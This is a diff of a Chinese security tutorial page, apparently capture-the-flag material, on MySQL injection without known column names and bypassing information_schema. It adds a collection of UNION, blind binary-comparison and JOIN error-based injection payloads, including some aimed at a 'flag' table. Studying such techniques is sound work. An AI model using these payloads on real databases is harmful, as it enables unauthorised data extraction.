@@ -1198,9 +1198,27 @@
                   <h1>No Column Injection & Bypass Information_schema</h1>
                 
                 <blockquote>
-<p>本文作者@zww</p>
+<p>本文作者 <a href="hhttp://www.wenweizeng.com/2020/03/04/NoColumnInjection-BypassInformation-schema/#more">@zww</a></p>
 </blockquote>
 <h2 id="_1">无列名注入</h2>
+<p>首先给出payload合集：
+<div class="highlight"><pre><span></span><code><span class="c1">-- UNION注入</span>
+<span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="o">`</span><span class="mi">2</span><span class="o">`</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="k">c</span><span class="p">);</span>
+<span class="o">##</span> <span class="err">无逗号版本</span>
+<span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">)</span><span class="n">m</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span> <span class="o">`</span><span class="n">b</span><span class="o">`</span><span class="p">)</span><span class="n">n</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">3</span> <span class="o">`</span><span class="k">c</span><span class="o">`</span><span class="p">)</span><span class="n">t</span> <span class="k">where</span> <span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">)</span><span class="n">x</span><span class="p">;</span>
+
+<span class="c1">-- 比较注入</span>
+<span class="o">##</span> <span class="err">使用</span><span class="nb">binary</span>
+<span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,(</span><span class="nb">binary</span> <span class="s1">&#39;G&#39;</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+<span class="o">##</span> <span class="err">使用</span><span class="k">cast</span>
+<span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">cast</span><span class="p">(</span><span class="s1">&#39;G&#39;</span> <span class="k">as</span> <span class="nb">binary</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+<span class="o">##</span> <span class="err">使用</span><span class="k">convert</span>
+<span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">convert</span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">,</span> <span class="nb">binary</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
+
+<span class="c1">-- JOIN报错注入</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="n">a</span> <span class="k">join</span> <span class="n">newtable</span> <span class="n">b</span><span class="p">)</span><span class="k">c</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span> <span class="n">a</span> <span class="k">join</span> <span class="n">newtable</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">))</span><span class="k">c</span><span class="p">;</span>
+</code></pre></div></p>
 <h3 id="union">UNION注入</h3>
 <p><div class="highlight"><pre><span></span><code><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">newtable</span><span class="p">;</span>      
 <span class="o">+</span><span class="c1">------+------+----------+</span>
@@ -1314,7 +1332,7 @@ payload:
 </code></pre></div>
 但是在这个情况下，明明ascii(G)是小于ascii(f)，为什么会返回1呢</p>
 <p>这是因为 <strong>mysql默认是不区分大小写的</strong> ，所以说实际上比较的是ascii(g)与ascii(f)，当然前者大，返回1</p>
-<p>如果我们要比较ascii码的大小，那我们就需要使用**二进制字符串**进行比较</p>
+<p>如果我们要比较ascii码的大小，那我们就需要使用 <strong>二进制字符串</strong> 进行比较</p>
 <p>具体来说，mysql可以使用三类函数进行类型的转换
 | Name | Description |
 | ------ | ------ |
@@ -1330,7 +1348,7 @@ payload:
 <span class="o">##</span> <span class="err">使用</span><span class="k">convert</span>
 <span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">convert</span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">,</span> <span class="nb">binary</span><span class="p">))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
 </code></pre></div></p>
-<p>或者可以使用mysql9中新增的数据类型json，因为json的string类型是大小写敏感的</p>
+<p>或者可以使用mysql8中新增的数据类型json，因为json的string类型是大小写敏感的</p>
 <p><img alt="" src="../img/NoColumnInjection%26BypassInformation_schema/1.png" /></p>
 <p>payload:
 <div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;G&#39;</span><span class="p">,</span> <span class="k">cast</span><span class="p">(</span><span class="s1">&#39;0&#39;</span> <span class="k">as</span> <span class="n">json</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">));</span>
